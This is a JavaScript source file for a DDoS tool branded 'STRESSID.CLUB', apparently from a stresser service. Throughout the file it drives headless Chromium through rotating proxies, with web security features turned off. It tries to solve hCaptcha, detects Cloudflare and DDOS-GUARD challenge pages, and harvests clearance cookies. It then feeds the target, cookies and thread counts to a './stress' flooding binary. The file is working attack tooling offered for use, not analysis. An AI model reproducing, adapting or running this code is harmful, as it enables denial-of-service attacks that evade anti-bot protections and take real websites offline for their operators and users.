const fs = require('fs');
const {
  chromium
} = require('playwright-extra');
const url = require('url');
const {
  spawn
} = require('child_process');
require('events').EventEmitter.defaultMaxListeners = 0;

process.on('uncaughtException', function(err) {
  //console.log('Сейчас бы скрипт завис, но спас костыль. Вылезла необработанная ошибка: ' + err);
});

if (process.argv.length < 8) {
  console.log('\x1b[35m%s\x1b[0m', 'Owner script: STRESSID.CLUB // method: STORM-EMULATION');
  console.log('\x1b[35m%s\x1b[0m', 'mode url proxy duration threads ratelimit baloo=false [OPTIONAL: "RANDOM QUERY"]');
  process.exit(0);
}
async function getmain() {
  const mode = process.argv[2];
  let target_url = process.argv[3],
    target = target_url.split('""')[0];
  const proxyFile = process.argv[4];
  const timeforattack = process.argv[5];
  const browsernum = process.argv[6];
  const reqperip = process.argv[7];
  const baloo = process.argv[8];
  const rand_query = process.argv[9];
  const
    useragents = fs.readFileSync("ua.txt", 'utf-8').toString().split('\n'),
    proxies = fs.readFileSync(proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0),
    isattackstart = new Map();
  var session = [];

  function useragent() {
    return useragents[Math.floor(Math.random() * useragents.length)]
  }

  function randomProxies() {
    const whois = proxies[Math.floor(Math.random() * proxies.length)];
    proxies.remove(whois)
    return whois;
  }
  let domain = url.parse(target_url).hostname;
  Array.prototype.remove = function() {
    var what, a = arguments,
      L = a.length,
      ax;
    while (L && this.length) {
      what = a[--L];
      while ((ax = this.indexOf(what)) !== -1) {
        this.splice(ax, 1);
      }
    }
    return this;
  };
  async function addsession() {
    try {
      let random_ua = useragent();
      const randed = randomProxies();
      solving({
        "url": target,
        "host": domain,
        "proxy": randed,
        'user_agent': random_ua,
        'reqperip': reqperip,
        'mode': mode,
        'baloo': baloo
      }).then((cookie, ua) => {
        let myString = "";
        let laa_ = JSON.stringify(cookie);
        laa_ = JSON.parse(laa_);
        laa_.forEach((value) => {
          const valueString = value.name + "=" + value.value + ";";
          myString += valueString;
        });
        session.push({
          "myString": myString,
          "reqperip": reqperip,
          "randed": randed,
          'user_agent': random_ua,
          'mode': mode,
          'baloo': baloo
        })
        console.log('[ASYNC] User-Agent: ' + random_ua + ' ');
        console.log('[ASYNC] Cookie: ' + myString + ' ');
        start(mode, target, domain, timeforattack, browsernum, random_ua, myString, reqperip, randed, rand_query);
      }).catch((ee) => {
        try {
          console.log('[ASYNC] Proxy starting...');
          addsession();
          console.log('[ASYNC] Proxy started... \n\n');
        } catch (e) {}
      })
    } catch (e) {}
  }
  for (let i = 0; i < browsernum; i++) {
    console.log('[ASYNC] Proxy starting...');
    addsession();
    console.log('[ASYNC] Proxy started... \n\n');
  }
}
getmain();

function solving(message) {
  return new Promise((resolve, reject) => {
	console.log(`[ASYNC] Proxy ${message.proxy}`)
    chromium.launch({
      headless: true,
      javaScriptEnabled: true,
	  BypassCSP: true,
	  platform: 'Win64',
	  ColorScheme: 'dark',
	  IgnoreHTTPSErrors: true,
	  IgnoreDefaultArgs: true,
      proxy: {
        server: `${message.proxy}`
      },
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-web-security',
        '--viewport-size 1920, 1080',
        '--enable-automation',
        '--disable-blink-features',
        '--disable-blink-features=AutomationControlled',
        '--hide-scrollbars',
        '--mute-audio',
        '--disable-gl-drawing-for-tests',
        '--disable-canvas-aa',
        '--disable-2d-canvas-clip-aa',
        '--disable-web-security',
        '--ignore-certificate-errors',
        '--ignore-certificate-errors-spki-list',
        '--disable-features=IsolateOrigins,site-per-process',
        '--user-agent'
      ]
    }).then(async(browser) => {
	  const context = await browser.newContext({
		  userAgent: 'Mozilla/5.0 (Windows NT 6.1; rv:104.0) Gecko/20100101 Firefox/104.0'
	  });
      const page = await context.newPage();
	  await page.setDefaultNavigationTimeout(0);
      await page.setViewportSize({
        width: 1920,
        height: 1080
      });
      const gotosite = await page.goto(message.url);
      page.on('dialog', async dialog => {
          await dialog.accept();
        });	  
      await page.waitForTimeout(10000, {
        waitUntil: 'networkidle0'
      })
        try {
		const response = await gotosite.status();
          if (response == "200") {
            await page.reload();
            await page.waitForTimeout(2000, {
              waitUntil: 'networkidle0'
            })
          } 
		  if (response == "403") {
            await page.waitForTimeout(2000, {
              waitUntil: 'networkidle0'
            })
            await page.reload();
          }
		  if (response == "503") {
            await page.waitForTimeout(2000, {
              waitUntil: 'networkidle0'
            })
            await page.reload();			  
		  }
        } catch (error1) {
          console.log('[ASYNC] No bypassing // STRESSID.CLUB');
		  await context.close();
          await browser.close();
		  reject(error1);
        }
        try {
			const maybecaptchav1 = await page.$('#h-captcha');
			if (maybecaptchav1)
			{
				console.log(`[STRESSID.CLUB] Found hcaptcha, bypassing... | [v1]`)
				await page.waitForSelector('#h-captcha');
				await page.solveRecaptchas()
				try {
					console.log(`[STRESSID.CLUB] Try bypass hcaptcha... | [v1]`)	
					await page.waitForNavigation({waitUntil: 'domcontentloaded', timeout: 25000});
				} catch (eds) {
					console.log(`[STRESSID.CLUB] No bypass hcaptcha [v1]`)
					reject(eds)
					await context.close();
					await browser.close();
				}						
			}			
          const title = await page.title();
          if (title == 'Just a moment...') {
			context.close();
			browser.close();
            console.log('[ASYNC] No bypass UAM');
          } if (title == 'DDOS-GUARD') {
			context.close();
            browser.close();
            console.log('[ASYNC] No bypass UAM');
          } if (title == 'Access denied') {
			context.close();
            browser.close();
            console.log('[ASN] Proxy block');
          }		  
        } catch (error2) {
		  reject(error2);
		  await context.close();
          await browser.close();
        }
		try {			
			//await page.screenshot({ path: 'screenshot.png', fullPage: true });
			const cookies = await page.context().cookies();
			//const headers = await page.context().storageState();
			//console.log(await page.evaluate(() => navigator.platform))
			//console.log(headers);
			if (cookies) {
			  console.log('[ASYNC] Get cookie // STRESSID.CLUB');
			  resolve(cookies);
			  await context.close();
			  await browser.close();
			  return;
			}
		} catch (nocookie) {
			//console.log(nocookie);
			reject(nocookie);
			await context.close();
			await browser.close();			
		}
    })
  })
}

function start(mode, target, domain, timeforattack, browsernum, random_ua, myString, reqperip, randed, rand_query) {
  let promise = new Promise((res, rej) => {
    const ls = spawn('./stress', ["mode=" + mode, "url=" + target, "domain=" + domain, "limit=1", "time=" + timeforattack, "good=" + randed, "threads=" + reqperip, "cookie=" + myString, "user_agent=" + random_ua, "rand_query=" + rand_query]);
    ls.stdout.on('data', (data) => {
      return res();
    });
  })
}